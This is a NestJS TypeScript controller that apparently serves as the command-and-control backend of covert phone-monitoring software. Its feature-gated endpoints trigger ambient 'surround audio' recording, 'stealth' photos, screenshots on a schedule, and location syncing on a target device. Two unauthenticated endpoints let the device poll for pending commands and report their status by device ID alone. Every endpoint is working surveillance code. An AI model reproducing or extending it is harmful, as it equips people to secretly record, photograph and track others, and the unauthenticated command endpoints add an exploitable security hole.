import { Controller, Get, Post, Body, Param, UseGuards } from '@nestjs/common';
import { 
  CommandsService, 
  SurroundAudioCommandDto, 
  StealthPhotoCommandDto, 
  ScreenshotCommandDto, 
  SyncLocationCommandDto 
} from './commands.service';
import { JwtAuthGuard } from '../auth/guards/jwt-auth.guard';
import { FeatureGateGuard } from '../auth/guards/feature-gate.guard';
import { RequireFeature } from '../auth/decorators/require-feature.decorator';
import { Public } from '../auth/decorators/public.decorator';

@UseGuards(JwtAuthGuard, FeatureGateGuard)
@Controller('commands')
export class CommandsController {
  constructor(private readonly commandsService: CommandsService) {}

  @RequireFeature('call_recordings')
  @Post('surround-audio')
  async triggerSurroundAudio(@Body() dto: SurroundAudioCommandDto) {
    return this.commandsService.triggerSurroundAudio(dto);
  }

  @RequireFeature('stealth_photos')
  @Post('stealth-photo')
  async triggerStealthPhoto(@Body() dto: StealthPhotoCommandDto) {
    return this.commandsService.triggerStealthPhoto(dto);
  }

  @RequireFeature('screenshots')
  @Post('screenshot')
  async triggerScreenshot(@Body() dto: ScreenshotCommandDto) {
    return this.commandsService.triggerScreenshot(dto);
  }

  @RequireFeature('location')
  @Post('sync-location')
  async triggerLocationSync(@Body() dto: SyncLocationCommandDto) {
    return this.commandsService.triggerLocationSync(dto);
  }

  @RequireFeature('screenshots')
  @Post('screenshot/schedule')
  async setScreenshotSchedule(@Body() body: { deviceId: string; active: boolean; durationMin?: number; intervalSec?: number; startDelayMin?: number; startTime?: number }) {
    return this.commandsService.setScreenshotSchedule(body);
  }

  @RequireFeature('screenshots')
  @Get('screenshot/schedule/:deviceId')
  async getScreenshotSchedule(@Param('deviceId') deviceId: string) {
    return this.commandsService.getScreenshotSchedule(deviceId);
  }

  @Public()
  @Get('pending/:deviceId')
  async getPendingCommands(@Param('deviceId') deviceId: string) {
    return this.commandsService.getPendingCommands(deviceId);
  }

  @Public()
  @Post('status')
  async updateCommandStatus(@Body() body: { deviceId: string; commandId: string; status: 'PENDING' | 'SUCCESS' | 'FAILED'; error?: string }) {
    return this.commandsService.updateCommandStatus(body);
  }

  @Get('status/:deviceId')
  async getCommandStatuses(@Param('deviceId') deviceId: string) {
    return this.commandsService.getCommandStatuses(deviceId);
  }
}
